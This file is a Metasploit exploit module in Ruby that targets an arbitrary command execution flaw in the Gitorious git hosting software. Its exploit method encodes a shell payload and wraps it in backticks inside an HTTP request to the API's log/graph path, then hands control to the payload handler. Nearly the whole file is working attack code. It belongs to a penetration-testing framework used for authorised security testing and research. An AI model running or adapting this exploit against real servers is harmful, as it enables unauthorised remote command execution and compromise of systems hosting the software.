##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Gitorious Arbitrary Command Execution',
      'Description'    => %q{
          This module exploits an arbitrary command execution vulnerability
        in gitorious. Unvalidated input is passed to the shell allowing
        command execution.
      },
      'Author'         => [ 'joernchen <joernchen[at]phenoelit.de>' ], #Phenoelit
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '78480' ],
          [ 'URL', 'http://gitorious.org/gitorious/mainline/commit/647aed91a4dc72e88a27476948dfbacd5d0bf7ce' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'BadChars' => "\x60",
          'DisableNops' => true,
          'Space'       => 31337,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
            }
        },
      'Platform'       => %w{ linux unix },
      'Arch'           => ARCH_CMD,
      'DefaultTarget'  => 0,
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => '2012-01-19'
      ))

      register_options(
        [
          OptString.new('URI', [true, "Path to project and repository", "/project/repo"]),
        ])
  end

  def exploit
    # Make sure the URI begins with a slash
    uri = normalize_uri(datastore['URI'])

    command = Rex::Text.uri_encode(payload.raw, 'hex-noslashes')
    command.gsub!("%20","%2520")
    res = send_request_cgi({
      'uri'     => "/api"+ uri + "/log/graph/%60#{command}%60",
      'method'  => 'GET',
      'headers' =>
      {
        'Connection' => 'Close',
      }
    }) #default timeout, we don't care about the response

    if (res)
      print_status("The server returned: #{res.code} #{res.message}")
    end

    handler
  end
end
